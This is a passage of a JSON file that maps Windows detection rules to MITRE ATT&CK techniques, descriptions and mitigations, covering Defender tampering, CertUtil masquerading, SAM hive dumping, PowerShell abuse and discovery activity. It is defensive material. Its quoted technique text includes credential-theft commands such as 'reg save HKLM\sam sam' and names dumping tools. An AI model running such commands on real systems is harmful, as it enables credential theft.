cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92012,
        "rule_description": "Windows Defender Controlled folder access was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92013,
        "rule_description": "Windows Defender network protection was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92014,
        "rule_description": "Microsoft Active Protection Service (MAPS) was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92015,
        "rule_description": "Windows Defender sample submit was disabled by Powershell command",
        "mitre_id": [
            "T1562.001"
        ],
        "possible_attacks": [
            "Disable or Modify Tools"
        ],
        "description": [
            "Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.\n\nAdversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking]( adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection. \n\nAdversaries may also focus on specific applications such as Sysmon. For example, the \u201cStart\u201d and \u201cEnable\u201d values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging. \n\nOn network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.\n\nIn cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor.\n\nFurthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools. For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.\n\nAdditionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation]( which may lead to bypassing anti-tampering features."
        ],
        "mitigation_strategies": [
            "Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services."
        ]
    },
    {
        "rule_id": 92016,
        "rule_description": "Masqueraded CertUtil.exe with a different file name. Possible use to decode malware",
        "mitre_id": [
            "T1036.003",
            "T1140"
        ],
        "possible_attacks": [
            "Rename System Utilities"
        ],
        "description": [
            "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. "
        ],
        "mitigation_strategies": [
            "Use file system access controls to protect folders such as C:\\Windows\\System32."
        ]
    },
    {
        "rule_id": 92017,
        "rule_description": "Masqueraded CertUtil.exe used to decode binary file",
        "mitre_id": [
            "T1036.003",
            "T1140"
        ],
        "possible_attacks": [
            "Rename System Utilities"
        ],
        "description": [
            "Adversaries may rename legitimate system utilities to try to evade security mechanisms concerning the usage of those utilities. Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing.  It may be possible to bypass those security mechanisms by renaming the utility prior to utilization (ex: rename <code>rundll32.exe</code>).  An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths. "
        ],
        "mitigation_strategies": [
            "Use file system access controls to protect folders such as C:\\Windows\\System32."
        ]
    },
    {
        "rule_id": 92018,
        "rule_description": "CertUtil.exe used to decode binary file",
        "mitre_id": [
            "T1140"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92019,
        "rule_description": "Windows Defender executed from suspicious path, possible DLL side-loading",
        "mitre_id": [
            "T1574.002"
        ],
        "possible_attacks": [
            "DLL Side-Loading"
        ],
        "description": [
            "Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to [DLL Search Order Hijacking]( side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).\n\nSide-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process."
        ],
        "mitigation_strategies": [
            "Update software regularly to include patches that fix DLL side-loading vulnerabilities."
        ]
    },
    {
        "rule_id": 92020,
        "rule_description": "A file was copied to other system over SSH using pscp.exe",
        "mitre_id": [
            "T1021.004"
        ],
        "possible_attacks": [
            "SSH"
        ],
        "description": [
            "Adversaries may use [Valid Accounts]( to log into remote machines using Secure Shell (SSH). The adversary may then perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized users to open remote shells on other computers. Many Linux and macOS versions come with SSH installed by default, although typically disabled until the user enables it. The SSH server can be configured to use standard password authentication or public-private keypairs in lieu of or in addition to a password. In this authentication scenario, the user\u2019s public key must be in a special file on the computer running the server that lists which keypairs are allowed to login as that user."
        ],
        "mitigation_strategies": [
            "Limit which user accounts are allowed to login via SSH."
        ]
    },
    {
        "rule_id": 92021,
        "rule_description": "Powershell was used to delete files or directories",
        "mitre_id": [
            "T1070.004"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92022,
        "rule_description": "Gathered user information from Remote Desktop Service sessions",
        "mitre_id": [
            "T1033"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92023,
        "rule_description": "Suspicious Powershell activity with VSS and Windows SAM hive",
        "mitre_id": [
            "T1003.002",
            "T1059.001"
        ],
        "possible_attacks": [
            "Security Account Manager",
            "PowerShell"
        ],
        "description": [
            "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](\n* [Mimikatz](\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92024,
        "rule_description": "Powershell used to copy SAM hive from VSS",
        "mitre_id": [
            "T1003.002",
            "T1059.001"
        ],
        "possible_attacks": [
            "Security Account Manager",
            "PowerShell"
        ],
        "description": [
            "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](\n* [Mimikatz](\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92025,
        "rule_description": "Reg.exe execution",
        "mitre_id": [
            "T1112",
            "T1012"
        ],
        "possible_attacks": [
            "Modify Registry"
        ],
        "description": [
            "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\n\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility [Reg]( may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\n\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via [Reg]( or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.  \n\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often [Valid Accounts]( are required, along with access to the remote system's [SMB/Windows Admin Shares]( for RPC communication."
        ],
        "mitigation_strategies": [
            "Ensure proper permissions are set for Registry hives to prevent users from modifying keys for system components that may lead to privilege escalation."
        ]
    },
    {
        "rule_id": 92026,
        "rule_description": "Reg.exe used to dump SAM hive",
        "mitre_id": [
            "T1003.002"
        ],
        "possible_attacks": [
            "Security Account Manager"
        ],
        "description": [
            "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.\n\nA number of tools can be used to retrieve the SAM file through in-memory techniques:\n\n* pwdumpx.exe\n* [gsecdump](\n* [Mimikatz](\n* secretsdump.py\n\nAlternatively, the SAM can be extracted from the Registry with Reg:\n\n* <code>reg save HKLM\\sam sam</code>\n* <code>reg save HKLM\\system system</code>\n\nCreddump7 can then be used to process the SAM database locally to retrieve hashes.\n\nNotes: \n\n* RID 500 account is the local, built-in administrator.\n* RID 501 is the guest account.\n* User accounts start with a RID of 1,000+.\n"
        ],
        "mitigation_strategies": [
            "Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts."
        ]
    },
    {
        "rule_id": 92027,
        "rule_description": "Powershell process spawned powershell instance",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92028,
        "rule_description": "Powershell executed script",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92029,
        "rule_description": "Powershell executed script from suspicious location",
        "mitre_id": [
            "T1059.001"
        ],
        "possible_attacks": [
            "PowerShell"
        ],
        "description": [
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92030,
        "rule_description": "Gathered user information from Remote Desktop Service sessions",
        "mitre_id": [
            "T1033"
        ],
        "possible_attacks": [],
        "description": [],
        "mitigation_strategies": []
    },
    {
        "rule_id": 92031,
        "rule_description": "Discovery activity executed",
        "mitre_id": [
            "T1087"
        ],
        "possible_attacks": [
            "Account Discovery"
        ],
        "description": [
            "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell]( and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files."
        ],
        "mitigation_strategies": [
            "Manage the creation, modification, use, and permissions associated to user accounts."
        ]
    },
    {
        "rule_id": 92032,
        "rule_description": "Suspicious Windows cmd shell execution",
        "mitre_id": [
            "T1087",
            "T1059.003"
        ],
        "possible_attacks": [
            "Account Discovery",
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell]( and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Manage the creation, modification, use, and permissions associated to user accounts.",
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92033,
        "rule_description": "Discovery activity spawned via powershell execution",
        "mitre_id": [
            "T1087",
            "T1059.001"
        ],
        "possible_attacks": [
            "Account Discovery",
            "PowerShell"
        ],
        "description": [
            "Adversaries may attempt to get a listing of valid accounts, usernames, or email addresses on a system or within a compromised environment. This information can help adversaries determine which accounts exist, which can aid in follow-on behavior such as brute-forcing, spear-phishing attacks, or account takeovers (e.g., [Valid Accounts](\n\nAdversaries may use several methods to enumerate accounts, including abuse of existing tools, built-in commands, and potential misconfigurations that leak account names and roles or permissions in the targeted environment.\n\nFor examples, cloud environments typically provide easily accessible interfaces to obtain user lists. On hosts, adversaries can use default [PowerShell]( and other command line functionality to identify accounts. Information about email addresses and accounts may also be extracted by searching an infected system\u2019s files.",
            "Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).\n\nPowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.\n\nA number of PowerShell-based offensive testing tools are available, including [Empire](  [PowerSploit]( [PoshC2]( and PSAttack.\n\nPowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI)."
        ],
        "mitigation_strategies": [
            "Manage the creation, modification, use, and permissions associated to user accounts.",
            "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.\n\nPowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
        ]
    },
    {
        "rule_id": 92034,
        "rule_description": "Discovery activity spawned via cmd shell execution",
        "mitre_id": [
            "T1135"
        ],
        "possible_attacks": [
            "Network Share Discovery"
        ],
        "description": [
            "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   [Net]( can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services."
        ],
        "mitigation_strategies": [
            "Enable Windows Group Policy \u201cDo Not Allow Anonymous Enumeration of SAM Accounts and Shares\u201d security setting to limit users who can enumerate network shares."
        ]
    },
    {
        "rule_id": 92035,
        "rule_description": "A net.exe domain discovery command was executed",
        "mitre_id": [
            "T1135",
            "T1059.003"
        ],
        "possible_attacks": [
            "Network Share Discovery",
            "Windows Command Shell"
        ],
        "description": [
            "Adversaries may look for folders and drives shared on remote systems as a means of identifying sources of information to gather as a precursor for Collection and to identify potential systems of interest for Lateral Movement. Networks often contain shared network drives and folders that enable users to access file directories on various systems across a network. \n\nFile sharing over a Windows network occurs over the SMB protocol.   [Net]( can be used to query a remote system for available shared drives using the <code>net view \\\\\\\\remotesystem</code> command. It can also be used to query shared drives on the local system using <code>net share</code>. For macOS, the <code>sharing -l</code> command lists all shared points used for smb services.",
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel."
        ],
        "mitigation_strategies": [
            "Enable Windows Group Policy \u201cDo Not Allow Anonymous Enumeration of SAM Accounts and Shares\u201d security setting to limit users who can enumerate network shares.",
            "Use application control where appropriate."
        ]
    },
    {
        "rule_id": 92036,
        "rule_description": "A $(win.eventdata.image) binary was started by a Windows cmd shell",
        "mitre_id": [
            "T1059.003",
            "T1574.001"
        ],
        "possible_attacks": [
            "Windows Command Shell",
            "DLL Search Order Hijacking"
        ],
        "description": [
            "Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]( is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via [Remote Services]( such as [SSH](\n\nBatch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.\n\nAdversaries may leverage [cmd]( to execute various commands and payloads. Common uses include [cmd]( to execute a single command, or abusing [cmd]( interactively with input and output forwarded over a command and control channel.",
